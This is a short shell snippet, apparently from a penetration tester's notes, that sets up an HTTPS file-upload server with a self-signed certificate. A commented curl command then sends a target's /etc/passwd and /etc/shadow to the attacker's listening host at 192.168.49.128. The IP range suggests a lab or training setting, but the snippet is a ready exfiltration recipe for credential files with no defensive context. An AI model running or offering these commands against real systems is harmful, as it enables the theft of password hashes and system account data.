sudo python3 -m pip install --user uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server' #Create Self-signed cert
 mkdir https && cd https
 sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
 #GET THE FILES
 #curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
